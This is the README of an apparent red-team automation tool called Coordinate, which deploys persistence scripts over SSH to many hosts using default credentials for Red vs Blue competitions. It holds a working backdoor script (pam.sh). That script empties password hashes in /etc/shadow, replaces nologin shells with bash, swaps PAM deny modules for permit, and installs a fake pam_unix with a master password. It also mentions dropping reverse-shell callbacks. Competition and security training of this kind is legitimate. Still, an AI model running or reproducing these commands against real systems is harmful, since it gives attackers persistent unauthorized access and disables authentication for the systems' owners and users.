# Coordinate

Red team automation tool that runs many scripts in parallel on many remote boxes, assuming that you know the default creds. This is useful for deploying persistence mechanisms at minute zero in Red vs Blue competitions.

# Configuration

There are two parts to Coordinate-- the first is the config (`coordinate.toml`), which specifies targets, default creds, and modules to employ. 

The second part is the modules, which contain the scripts and logic to run through Coordinate.

Here is an configuration example for `coordinate.toml`:

```toml
NoTTY = false
ConnectionsPerBox = 5 # default to 3
CallBackIps = ["192.168.1.12","hackerbox"] # One will be randomly chosen every time we need to use one

[[target]]
Ips = ["127.0.0.1","192.168.140.138","172.17.x.129"]
ReplaceX = "1-5" # if you have an X in the above, iterate through range here
Modules = ["STARFOX",]
# user must be root or a sudoer
Username = "root"
Password = "Password1!"

[[target]]
Ips = ["10.20.10.11","10.20.10.13"]
Modules = ["ireul",]

[[module]]
Name = "ireul"
Stealthy = true # default false. up to scripts to make use of this
UseRoulette = false # default true. if false, when there are multiple ways to do something, do all of them
Level = 3 # default 0. range 0-5 where 0 is the most difficult mechanisms

[[module]]
Name = "STARFOX"
```

# Modules

For Coordinate to work, the modules must be structured in a certain way. First, the name of the module passed must be the same as a folder at the same level of Coordinate. For example, if my module was `STARFOX`, our file struture might be something like:

```bash
├── coordinate
│   ├── coordinate
│   ├── coordinate.go
│   ├── coordinate.toml
│   ├── go.mod
│   ├── go.sum
│   ├── LICENSE
│   ├── output.go
│   ├── README.md
│   └── ssher.go
├── ireul
│   ├── backdoor.sh
│   ├── fake-passwd.sh
│   ├── LICENSE
│   ├── README.md
│   └── vmware-hostd.sh
└── STARFOX
    ├── drops
    │   └── fake_pam.c
    ├── iptables.sh
    ├── pam.sh
    └── README.md
```

The second assumption is that any module scripts will end in `.sh`. That's it for structure. 

Onto module contents. For logic, there is no persistent state across files or across modules. Every file is interpreted at the same time it's executed. With that in mind, let's take a look at what `pam.sh` might look like:

```bash
# This is metadata about the file. NAME and DESC have no impact on the execution of the file.
#NAME pam
#DESC wrecks pam lol

# Any line starting with an octothorpe (#) without being a directive is treated as a comment, like this line.

# LEVEL specifies how "difficult" this mechanism is to detect and counter, so that a red teamer may be able to scale back the difficulty of the techs they're deploying. Lower is more difficult, where 0 is incredibly tough (e.g., well written rootkit) and 5 is trivial (e.g., added user).
# This defaults to 0 if it is not specified.
#LEVEL 2

# Optionally, you can set options for the script here. 'debug' means that you will see every command as it's executed, and that the script will wait for each command to finish so it can show you the stdout and stderr.
#SET debug

# These are the commands actually executed. In this case, it is removing the "passwords" for locked accounts, and permitting empty passwords in PAM's common-auth file for Debian-based systems.
sed -ie "s/*//g" /etc/shadow
sed -ie "s/\!//g" /etc/shadow
cp -f /bin/bash /bin/false
cp -f /bin/bash /usr/sbin/nologin

if [ -d "/etc/pam.d/common-auth" ]; then
    sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
fi

# Let's say that you have multiple ways to accomplish some task, e.g., circumventing PAM authentication. Roulettes will allow you to randomly select one of these techniques to execute. Sinci the script is interpreted line by line, this directive must also include how many roulette options there are.
#STARTROULETTE 3
#ROULETTE

# These commands allow authentication and substituting users if it's to the root account.
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su

#ROULETTE

# Instead of denying unsuccessful PAM authentication attempts, permit them.
sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth

#ROULETTE

# Replace pam_deny.so with pam_permit.so for Debian-based systems
cp -f /lib/x86_64-linux-gnu/security/pam_permit.so /lib/x86_64-linux-gnu/security/pam_deny.so

# This signifies the end of the roulette sections.
#ENDROULETTE

# Let's say that you've written code for a fake PAM shared object that allows one master password, as a backdoor. You can drop files with the #DROP directive. This assumes that your files are within $MODULE_PATH/drops.
#DROP fake_pam.so /tmp/systemd-cache

# Which you can then interact with using normal commands on the remote system.
gcc /tmp/systemd-cache -o /tmp/systemd-cache-compiled
cp -f /tmp/systemd-cache-compiled /lib/x86_64-linux-gnu/security/pam_unix.so

# If you want to see the output of a command, you can tell Coordinate to wait for it with the #OUTPUT directive.
#OUTPUT cat /etc/os-release

# If you want to take some conditional action based on the output of a command, but you want it to affect meta-tags/directives, you can use IFCMD. This is slower than using native if/else/fi within the shell.
#IFCMD cat /etc/password | grep "bob"

# You can print to the terminal with "red" or negative messages, or "green" or positive messages.
#PRINT_RED Bob is still on their system!

# Again, unlike native execution control, these directives control whether or not Coordinate will process a directive. In this example, if the string 'bob' is found in /etc/passwd, Coordinate will print the red message above. Otherwise, it will print the message below.
#ELSE

#PRINT_GREEN Bob has been removed! Good job blue team!

#ENDIF

# If you wanted to drop a callback/reverse shell script, you can use the text '#CALLBACK_IP' and Coordinate will replace it with a configured callback IP.
# TODO example of pam_exec callback ip
```
